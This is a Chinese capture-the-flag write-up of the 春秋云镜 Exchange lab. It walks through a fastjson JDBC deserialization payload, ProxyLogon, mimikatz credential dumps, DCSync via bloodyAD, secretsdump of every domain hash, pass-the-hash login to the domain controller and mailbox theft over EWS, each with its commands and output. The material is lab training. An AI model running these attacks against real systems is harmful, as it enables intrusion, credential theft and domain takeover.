---
title: "春秋云镜 Exchange Writeup"
date: 2023-08-09T14:06:40+08:00
lastmod: 2023-08-09T14:06:40+08:00
draft: false
author: "X1r0z"

tags: ['exchange', 'windows', 'ntlm']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Exchange Writeup

<!--more-->

## flag01

fscan

````shell
$ fscan ./fscan_darwin_arm64 -h 39.99.147.55
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.147.55    is alive
[*] Icmp alive hosts len is: 1
39.99.147.55:8000 open
39.99.147.55:80 open
39.99.147.55:22 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle: http://39.99.147.55       code:200 len:19813  title:lumia
[*] WebTitle: http://39.99.147.55:8000  code:302 len:0      title:None 跳转url: http://39.99.147.55:8000/login.html
[*] WebTitle: http://39.99.147.55:8000/login.html code:200 len:5662   title:Lumia ERP
已完成 3/3
[*] 扫描结束,耗时: 37.090838833s
````

8000 端口 Lumia ERP

右键源代码查看官网发现是华夏 ERP

![image-20230809112047697](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091120747.png)

网上随便找个未授权, 或者直接试弱口令也行

```
http://39.99.147.55:8000/user/getAllList;.ico
```

用户列表

```json
// 20230809112146
// http://39.99.147.55:8000/user/getAllList;.ico

{
  "code": 200,
  "data": {
    "userList": [
      {
        "id": 63,
        "username": "季圣华",
        "loginName": "jsh",
        "password": "e10adc3949ba59abbe56e057f20f883e",
        "position": "",
        "department": null,
        "email": "",
        "phonenum": "",
        "ismanager": 1,
        "isystem": 1,
        "status": 0,
        "description": "",
        "remark": null,
        "tenantId": 63
      },
      {
        "id": 120,
        "username": "管理员",
        "loginName": "admin",
        "password": "e10adc3949ba59abbe56e057f20f883e",
        "position": null,
        "department": null,
        "email": null,
        "phonenum": null,
        "ismanager": 1,
        "isystem": 0,
        "status": 0,
        "description": null,
        "remark": null,
        "tenantId": null
      },
      {
        "id": 131,
        "username": "测试用户",
        "loginName": "test123",
        "password": "e10adc3949ba59abbe56e057f20f883e",
        "position": "",
        "department": null,
        "email": "",
        "phonenum": "",
        "ismanager": 1,
        "isystem": 0,
        "status": 0,
        "description": "",
        "remark": null,
        "tenantId": 63
      }
    ]
  }
}
```

admin/123456

登录之后是 fastjson 1.2.55 RCE

https://su18.org/post/fastjson

根据题目的描述, 找到与 MySQL JDBC 反序列化相关的 payload

```json
{
	"@type": "java.lang.AutoCloseable",
	"@type": "com.mysql.jdbc.JDBC4Connection",
	"hostToConnectTo": "IP",
	"portToConnectTo": 3306,
	"url": "jdbc:mysql://IP:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
	"databaseToConnectTo": "test",
	"info": {
		"@type": "java.util.Properties",
		"PORT": "3306",
		"statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
		"autoDeserialize": "true",
		"user": "root",
		"PORT.1": "3306",
		"HOST.1": "IP",
		"NUM_HOSTS": "1",
		"HOST": "IP",
		"DBNAME": "test"
	}
}
```

发送

```http
GET /user/list?search=<urlencoded-payload> HTTP/1.1
Host: 39.99.147.55:8000
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://39.99.147.55:8000/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=AF23A4BF7BFE76BD694B34B77EAA7AA7
Connection: close


```

打 cc6 反弹 shell

![image-20230809113843826](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091138862.png)

flag01

![image-20230809114140080](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091141113.png)

## flag02

内网 fscan

```shell
root@iZ8vb57tz3th38lwxjgm9kZ:/tmp# ./fscan -h 172.22.3.0/24
   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
start infoscan
(icmp) Target 172.22.3.12     is alive
(icmp) Target 172.22.3.2      is alive
(icmp) Target 172.22.3.9      is alive
(icmp) Target 172.22.3.26     is alive
[*] Icmp alive hosts len is: 4
172.22.3.12:8000 open
172.22.3.26:445 open
172.22.3.9:445 open
172.22.3.2:445 open
172.22.3.9:443 open
172.22.3.26:139 open
172.22.3.9:139 open
172.22.3.2:139 open
172.22.3.26:135 open
172.22.3.9:135 open
172.22.3.2:135 open
172.22.3.9:81 open
172.22.3.9:80 open
172.22.3.9:808 open
172.22.3.12:22 open
172.22.3.2:88 open
172.22.3.12:80 open
172.22.3.9:8172 open
[*] alive ports len is: 18
start vulscan
[*] NetInfo:
[*]172.22.3.26
   [->]XIAORANG-PC
   [->]172.22.3.26
[*] NetInfo:
[*]172.22.3.9
   [->]XIAORANG-EXC01
   [->]172.22.3.9
[*] NetBios: 172.22.3.26     XIAORANG\XIAORANG-PC          
[*] NetInfo:
[*]172.22.3.2
   [->]XIAORANG-WIN16
   [->]172.22.3.2
[*] WebTitle: http://172.22.3.12        code:200 len:19813  title:lumia
[*] NetBios: 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393
[*] NetBios: 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393
[*] 172.22.3.2  (Windows Server 2016 Datacenter 14393)
[*] WebTitle: http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html
[*] WebTitle: http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP
[*] WebTitle: http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。
[*] WebTitle: https://172.22.3.9:8172   code:404 len:0      title:None
[*] WebTitle: http://172.22.3.9         code:403 len:0      title:None
[*] WebTitle: https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/
[*] WebTitle: https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0 code:200 len:28237  title:Outlook
已完成 18/18
[*] 扫描结束,耗时: 12.898584442s
```

整理信息

```
172.22.3.12 本机
172.22.3.2 XIAORANG-WIN16 DC
172.22.3.9 XIAORANG-EXC01 Exchange
172.22.3.26 XIAORANG-PC
```

Exchange Server 2016, 直接打 ProxyLogon

```shell
proxychains python3 proxylogon.py 172.22.3.9 administrator@xiaorang.lab
```

![image-20230809120310440](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091203479.png)

![image-20230809120324012](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091203053.png)

蚁剑连接

![image-20230809120432508](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091204549.png)

flag02

![image-20230809120512755](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091205789.png)

## flag04

mimikatz

```shell
Authentication Id : 0 ; 8864830 (00000000:0087443e)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2023/8/9 11:47:34
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : b0d89dce8c89f4a43758961e8f782174
	 * SHA1     : 8cd08c10732d44df7c9ae3daf7a57d1fcf81fef2
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : ......(略)
	ssp :	
	credman :	

Authentication Id : 0 ; 1923638 (00000000:001d5a36)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2023/8/9 11:21:30
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * NTLM     : e2182ab6bf81fc3456f24f40a45ad474
	 * SHA1     : 5f59166fb276e3054e98addc3a172830e9581f0d
	 * DPAPI    : 29f87549b6f984212f1c2fdeb223a57d
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 1892342 (00000000:001cdff6)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2023/8/9 11:21:29
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * NTLM     : e2182ab6bf81fc3456f24f40a45ad474
	 * SHA1     : 5f59166fb276e3054e98addc3a172830e9581f0d
	 * DPAPI    : 29f87549b6f984212f1c2fdeb223a57d
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 62605 (00000000:0000f48d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:39
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 9587463cfa3fd1ea760c401e2c52e224
	 * SHA1     : 162fc915ffccfa73c6f53b3c92f02690ccf7831c
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : ......(略)
	ssp :	
	credman :	

Authentication Id : 0 ; 9394570 (00000000:008f598a)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2023/8/9 11:56:34
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * NTLM     : 33cd42e4c654333ef6118bea55f376ba
	 * SHA1     : 1b11629d6b7f52c7059d00589243c1aa3a78fafb
	 * DPAPI    : ee7b03e971071a48e3efe37bde29f3a4
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:41
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 62574 (00000000:0000f46e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:39
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : b0d89dce8c89f4a43758961e8f782174
	 * SHA1     : 8cd08c10732d44df7c9ae3daf7a57d1fcf81fef2
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : ......(略)
	ssp :	
	credman :	

Authentication Id : 0 ; 21435 (00000000:000053bb)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:28
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : b0d89dce8c89f4a43758961e8f782174
	 * SHA1     : 8cd08c10732d44df7c9ae3daf7a57d1fcf81fef2
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	 [00000000]
	 * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
	 * Domain   : (null)
	 * Password : oJ}k3hFVCK]Kt5wi3@=!pTBG?%6|]8-1PwylC;OLC%T#5A-p.wGh{[Tv1g>yuyWbtSTdEE0|cWQtW=%42HC*Lo5bKk21Eh7t;5Kp-]B[-GcqgVv=%)hTyg_Xd}eM1Tt[
	 [00000001]
	 * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
	 * Domain   : (null)
	 * Password : oJ}k3hFVCK]Kt5wi3@=!pTBG?%6|]8-1PwylC;OLC%T#5A-p.wGh{[Tv1g>yuyWbtSTdEE0|cWQtW=%42HC*Lo5bKk21Eh7t;5Kp-]B[-GcqgVv=%)hTyg_Xd}eM1Tt[
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : XIAORANG-EXC01$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:28
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xiaorang-exc01$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 9399528 (00000000:008f6ce8)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2023/8/9 11:56:42
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * NTLM     : 33cd42e4c654333ef6118bea55f376ba
	 * SHA1     : 1b11629d6b7f52c7059d00589243c1aa3a78fafb
	 * DPAPI    : ee7b03e971071a48e3efe37bde29f3a4
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2524903 (00000000:002686e7)
Session           : RemoteInteractive from 2
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2023/8/9 11:21:58
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
	msv :	
	 [00000003] Primary
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
	tspkg :	
	wdigest :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2464229 (00000000:002599e5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/9 11:21:56
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : b0d89dce8c89f4a43758961e8f782174
	 * SHA1     : 8cd08c10732d44df7c9ae3daf7a57d1fcf81fef2
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : ......(略)
	ssp :	
	credman :	

Authentication Id : 0 ; 2464209 (00000000:002599d1)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/9 11:21:56
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : b0d89dce8c89f4a43758961e8f782174
	 * SHA1     : 8cd08c10732d44df7c9ae3daf7a57d1fcf81fef2
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : ......(略)
	ssp :	
	credman :	

Authentication Id : 0 ; 105180 (00000000:00019adc)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2023/8/9 11:19:41
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
	msv :	
	 [00000003] Primary
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
	tspkg :	
	wdigest :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : XIAORANG-EXC01$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:39
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : b0d89dce8c89f4a43758961e8f782174
	 * SHA1     : 8cd08c10732d44df7c9ae3daf7a57d1fcf81fef2
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xiaorang-exc01$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/8/9 11:19:39
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
```

Exchange 机器账户默认对域内成员具有 WriteDACL 权限, 因此可以写 DCSync

当然也可以从 BloodHound 里面看出来

```powershell
Invoke-BloodHound -CollectionMethods All
```

![image-20230809122719351](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091227407.png)

为 Zhangtong 添加 DCSync 权限

```shell
$ proxychains bloodyAD -d xiaorang.lab -u 'XIAORANG-EXC01$' -p :b0d89dce8c89f4a43758961e8f782174 --host 172.22.3.2 add dcsync Zhangtong
[+] Zhangtong is now able to DCSync
```

dump hash

```shell
$ proxychains secretsdump.py xiaorang.lab/Zhangtong@172.22.3.2 -hashes :22c7f81993e96ac83ac2f3f1903de8b4 -just-dc-ntlm

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
xiaorang.lab\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7acbc09a6c0efd81bfa7d5a1d4238beb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\$431000-7AGO1IPPEUGJ:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_46bc0bcd781047eba:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2554056e362e45ba9:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_ae8e35b0ca3e41718:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_341e33a8ba4d46c19:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_3d52038e2394452f8:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_2ddd7a0d26c84e7cb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_015b052ab8324b3fa:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_9bd6f16aa25343e68:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\SM_68af2c4169b54d459:1133:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
xiaorang.lab\HealthMailbox8446c5b:1135:aad3b435b51404eeaad3b435b51404ee:6a049c17ae6f214d0ce0bb958be94c7a:::
xiaorang.lab\HealthMailbox0d5918e:1136:aad3b435b51404eeaad3b435b51404ee:33cd42e4c654333ef6118bea55f376ba:::
xiaorang.lab\HealthMailboxeda7a84:1137:aad3b435b51404eeaad3b435b51404ee:1e89e23e265bb7b54dc87938b1b1a131:::
xiaorang.lab\HealthMailbox33b01cf:1138:aad3b435b51404eeaad3b435b51404ee:0eff3de35019c2ee10b68f48941ac50d:::
xiaorang.lab\HealthMailbox9570292:1139:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::
xiaorang.lab\HealthMailbox3479a75:1140:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::
xiaorang.lab\HealthMailbox2d45c5b:1141:aad3b435b51404eeaad3b435b51404ee:4822b67394d6d93980f8e681c452be21:::
xiaorang.lab\HealthMailboxec2d542:1142:aad3b435b51404eeaad3b435b51404ee:147734fa059848c67553dc663782e899:::
xiaorang.lab\HealthMailboxf5f7dbd:1143:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::
xiaorang.lab\HealthMailbox67dc103:1144:aad3b435b51404eeaad3b435b51404ee:4fe68d094e3e797cfc4097e5cca772eb:::
xiaorang.lab\HealthMailbox320fc73:1145:aad3b435b51404eeaad3b435b51404ee:0c3d5e9fa0b8e7a830fcf5acaebe2102:::
xiaorang.lab\Lumia:1146:aad3b435b51404eeaad3b435b51404ee:862976f8b23c13529c2fb1428e710296:::
Zhangtong:1147:aad3b435b51404eeaad3b435b51404ee:22c7f81993e96ac83ac2f3f1903de8b4:::
XIAORANG-WIN16$:1000:aad3b435b51404eeaad3b435b51404ee:b9df9852037915b5f26114769ace114a:::
XIAORANG-EXC01$:1103:aad3b435b51404eeaad3b435b51404ee:b0d89dce8c89f4a43758961e8f782174:::
XIAORANG-PC$:1104:aad3b435b51404eeaad3b435b51404ee:74d63202f94c220e09056568feafa894:::
[*] Cleaning up...
```

连接 DC 拿到 flag04

```shell
proxychains wmiexec.py xiaorang.lab/Administrator@172.22.3.2 -hashes :7acbc09a6c0efd81bfa7d5a1d4238beb -dc-ip 172.22.3.2
```

![image-20230809125150076](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091251130.png)

## flag03

Lumia 用户桌面有个 secrets.zip

![image-20230809123349708](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091233769.png)

flag

![image-20230809123459668](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091234724.png)

以为是用 Lumia 用户的 Hash 或者明文密码加密的, 结果试了半天试不出来

后来才发现提示在 Lumia 的邮箱里面

pth to ews 导出邮箱内容

```shell
proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password '00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296' --action Download
```

![image-20230809132523785](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091325842.png)

邮件信息

![image-20230809132548095](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091325154.png)

![image-20230809132557912](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091325964.png)

导出 csv 里面的电话号码, 然后用 john 批量爆破

![image-20230809132813185](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091328246.png)

解压后打开 docx 拿到 flag03

![image-20230809140532901](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308091405984.png)